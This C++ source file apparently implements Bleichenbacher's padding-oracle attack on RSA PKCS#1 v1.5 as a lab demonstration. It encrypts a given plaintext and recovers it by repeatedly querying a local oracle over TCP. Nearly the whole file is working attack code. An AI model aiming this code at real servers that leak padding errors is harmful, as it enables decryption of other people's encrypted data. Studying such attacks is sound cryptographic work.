//============================================================================
// Name        : Adversary.cpp
// Author      : YuchenWang
// Version     : 0.0.1
// Description : The bleichenbacher adversary source file
//============================================================================

#include "Adversary.h"

Adversary::Adversary():set(),total_query(0) {
	// TODO Auto-generated constructor stub
	pub_key =NULL;
	C = NULL;
	B = NULL;
	B2 = NULL;
	B3 = NULL;
	s = NULL;
}

Adversary::Adversary(char *path,char *plaintext,int plaintext_length):total_query(0){
	int max_len  = 0,to_len = 0,k = 0;
	unsigned char *to;
	BIGNUM *tmp = NULL,*index = NULL;
	BN_CTX * bn_ctx;

	//Read the public key from file
	BIO *file = BIO_new(BIO_s_file());
	if(BIO_read_filename(file,path)<=0){
		ERR_print_errors_fp(stderr);
		throw runtime_error("Can't open public key file.");
	}else
		pub_key = PEM_read_bio_RSA_PUBKEY(file,&pub_key,NULL,NULL);
	BIO_free(file);

	//encode the plain text to C
	if(pub_key != NULL){
		max_len = RSA_size(pub_key);
		to = new unsigned char[max_len];
		to_len = RSA_public_encrypt(plaintext_length,(const unsigned char*)plaintext,to,pub_key,RSA_PKCS1_PADDING);
		if(to_len <= 0){
			ERR_print_errors_fp(stderr);
			throw runtime_error("RSA public encrypt failed.");
		}
		C = BN_new();
		C = BN_bin2bn(to,to_len,C);
	}else{
		ERR_print_errors_fp(stderr);
		throw  runtime_error("No RSA public key.");
	}

	//calculte B
	tmp = BN_new();
	index = BN_new();
	B = BN_new();
	bn_ctx = BN_CTX_new();
	k = BN_num_bytes(pub_key->n);
	k = 8*(k - 2);
	BN_set_word(tmp,2);
	BN_set_word(index, k);
	BN_exp(B,tmp,index,bn_ctx);//B = 2^(8*(k-2))
	//calculate B2 and B3;
	B2 = BN_dup(B);
	B3 = BN_dup(B);
	BN_mul_word(B2,2);
	BN_mul_word(B3,3);
	BN_sub_word(B3,1);
	//just allocate s a memory and set s as 1
	s = BN_new();
	BN_set_word(s,1);

	//set the interval set by B
	set = new IntervalSet(B);

	BN_free(tmp);
	BN_free(index);
	BN_CTX_free(bn_ctx);
	free(to);
}



int Adversary::Adversary_Query(int & query_fd){
	int p_len = 0,ret = 0;
	char out_buff[max_len],in_buff[max_len];

	if(C != NULL && s != NULL){
		memset(out_buff,'\0',max_len);
		BIGNUM *test = NULL;
		unsigned char *p = (unsigned char*)out_buff;
		unsigned char *u = p;
		BN_CTX *ctx = BN_CTX_new();

		//test = c*s^e mode n
		test = BN_new();
		BN_mod_exp(test,s,pub_key->e,pub_key->n,ctx);//s^e mod n
		BN_mod_mul(test,C,test,pub_key->n,ctx);//C*s^e mod n
		p_len = BN_num_bytes(test);
		s2n(p_len,p);
		BN_bn2bin(test,p);
		p_len += 2;

		if(write(query_fd,u,p_len)<0)
			throw runtime_error("Write into oracle failed");
		memset(in_buff,'\0',max_len);
		if(read(query_fd,in_buff,max_len)<0)
			throw runtime_error("Read from oracle failed");
		if(strcmp(in_buff,"positive")==0)
			ret =1;
		else ret = 0;

		BN_CTX_free(ctx);
		BN_free(test);
	}else{
		cout<<"No data to be queried"<<endl;
	}
	return ret;
}

int Adversary::Adversary_Step2(int port,char mode){
	struct sockaddr_in ad;
	int query_fd = 0,ret = 0,retry =1000;
	BN_CTX *ctx = BN_CTX_new();

	//Open a TCP connection
	query_fd = socket (AF_INET, SOCK_STREAM, 0);
	memset (&ad, '\0', sizeof(ad));
	ad.sin_family  = AF_INET;
	ad.sin_addr.s_addr = inet_addr ("127.0.0.1");
	ad.sin_port = htons(port);
	while(connect(query_fd, (struct sockaddr*) &ad,sizeof(ad))<0){
		retry --;
		if(retry ==0)
			throw runtime_error("Can't connect to the Oracle");
	}
	//according to different mode ,query step2a/b/c
	switch(mode){
	case 'a':
		BN_copy(s,B3);
		BN_add_word(s,1);//3B-1
		BN_div(s,NULL,pub_key->n,s,ctx);//n/3B
		while(Adversary_Query(query_fd)!=1){
			BN_add_word(s,1);
			ret++;
		}
		break;
	case 'b'://with only one interval left
		BN_add_word(s,1);
		while(Adversary_Query(query_fd)!=1){
					BN_add_word(s,1);
					ret++;
				}
		break;
	case 'c'://only one interval left
		{
			list<Interval*> list = set->set;
			Interval * element = list.front();
			BIGNUM *a = BN_new();
			BIGNUM *b = BN_new();
			BIGNUM *r = BN_new();
			BIGNUM *rem = BN_new();
			BIGNUM *s_up = BN_new();
			bool r_need_add = false;
			element->Interval_get_bound(a,b);
			BN_mul(r,b,s,ctx);//b*si-1
			BN_sub(r,r,B2);//b*si-1-2B
			BN_div(r,NULL,r,pub_key->n,ctx);//(b*si-1-2B)/n
			BN_mul_word(r,2);
			do{
				r_need_add = false;
				BN_copy(s,r);
				BN_mul(s,s,pub_key->n,ctx);//n*ri
				BN_copy(s_up,s);
				BN_add(s,s,B2);//ri*n+2B
				BN_div(s,rem,s,b,ctx);//(ri*n+2B)/b
				if(!BN_is_zero(rem))
					BN_add_word(s,1);
				BN_add(s_up,s_up,B3);
				BN_add_word(s_up,1);//n*ri+3B
				BN_div(s_up,NULL,s_up,a,ctx);//(n*ri+3B)/a
				while(Adversary_Query(query_fd)!=1){
					BN_add_word(s,1);
					ret++;
					if(BN_cmp(s,s_up)>= 0){
						r_need_add = true;
						break;
					}
				}
			if(r_need_add  == true){
				BN_add_word(r,1);
				r_need_add = false;
			}else
				break;
			}while(true);
			BN_free(a);
			BN_free(b);
			BN_free(r);
			BN_free(s_up);
			BN_free(rem);
			break;
		}
	default:
		throw runtime_error("Unknown option in step 2");
	}
	//for test
	/*
	BIO *bio_test = BIO_new_fp(stdout,BIO_NOCLOSE);
	BN_print(bio_test,s);
	cout<<endl;
	BIO_free(bio_test);
	 */
	close(query_fd);
	BN_CTX_free(ctx);
	return ret;
}

void Adversary::Adversary_Step3(){
	IntervalSet *M_new = new IntervalSet();
	Interval *interval_new;
	list<Interval*> list = set->set;
	ListIter iter;
	BIGNUM *a = BN_new();
	BIGNUM *b = BN_new();
	BIGNUM *r = BN_new();
	BIGNUM *r_up = BN_new();
	BIGNUM *bound_down = BN_new();
	BIGNUM *bound_up = BN_new();
	BIGNUM *rem = BN_new();
	BN_CTX *ctx = BN_CTX_new();

	//For all [a,b] in Mi-1,Now si-1 should be changed as si
	for(iter =list.begin(); iter != list.end();++iter){
		(*iter)->Interval_get_bound(a,b);
		//r_down bound = a*si-(3B-1)/n
		BN_mul(r,a,s,ctx);
		BN_sub(r,r,B3);
		BN_div(r,rem,r,pub_key->n,ctx);
		if(!BN_is_zero(rem))
			BN_add_word(r,1);
		//r_up bound = b*si-2B/n
		BN_mul(r_up,b,s,ctx);
		BN_sub(r_up,r_up,B2);
		BN_div(r_up,NULL,r_up,pub_key->n,ctx);
		// for all r in[r_down,r_up]
		while(BN_cmp(r,r_up)<=0){
			//calculate the interval need to be unioned
			//max(2B+rn/si , a)
			BN_mul(bound_down,r,pub_key->n,ctx);//r*n
			BN_add(bound_down,bound_down,B2);//r*n+2B
			BN_div(bound_down,rem,bound_down,s,ctx);//(r*n+2B)/s
			if(!BN_is_zero(rem))
				BN_add_word(bound_down,1);
			if(BN_cmp(a,bound_down)>0)
				BN_copy(bound_down,a);
			//min(3B-1+rn/si , b)
			BN_mul(bound_up,r,pub_key->n,ctx);//r*n
			BN_add(bound_up,bound_up,B3);//r*n+(3B-1)
			BN_div(bound_up,NULL,bound_up,s,ctx);//(r*n+3B-1)/s
			if(BN_cmp(bound_up,b)>0)
				BN_copy(bound_up,b);

			//Union the new interval into the interval set
			interval_new = new Interval(bound_down,bound_up);
			M_new->IntervalSet_Union(interval_new);

			BN_add_word(r,1);
		}
	}
	//use Mi instead of Mi-1
	delete set;
	set = M_new;
	set->IntervalSet_Show_Totallen();
	//memory need to free, don't forget it
	BN_free(a);
	BN_free(b);
	BN_free(r);
	BN_free(r_up);
	BN_free(bound_up);
	BN_free(bound_down);
	BN_CTX_free(ctx);
}

int Adversary::Adversary_Step4(){
	int ret = 0;
	BIGNUM *a = BN_new();
	BIGNUM *b = BN_new();
	if(set->IntervalSet_Num()==1){
		list<Interval*> list = set->set;
		list.front()->Interval_get_bound(a,b);
		BIO* out = BIO_new_fp(stdout,BIO_NOCLOSE);
		/*
		cout<<endl;
		BN_print(out,a);
		cout<<endl;
		BN_print(out,b);
		cout<<endl;*/
		//BN_add_word(a,1);
		if(BN_cmp(a,b) == 0){
			ret = 1;
			cout<<"The result: ";
			BN_print(out,b);
			cout<<endl;
			BIO_free(out);
			//m = a*s-1 mod n
		}
	}
	BN_free(a);
	BN_free(b);
	return ret;
}
int Adversary::Adversary_Attack(int port){
	int ret = 1;
	//check that the adversary is initialized correctly
	if(B  == NULL || C  == NULL||s == NULL ||set->IntervalSet_Num()  ==  0)
		throw runtime_error("The adversary not ready yet");
	total_query += Adversary_Step2(port,'a');
	Adversary_Step3();
	while(Adversary_Step4()!=1){
		if(set->IntervalSet_Num()>1)
			total_query += Adversary_Step2(port,'b');
		else
			total_query += Adversary_Step2(port,'c');
		Adversary_Step3();
	}
	cout<<"The total query time : "<<total_query<<endl;
	return ret;
}


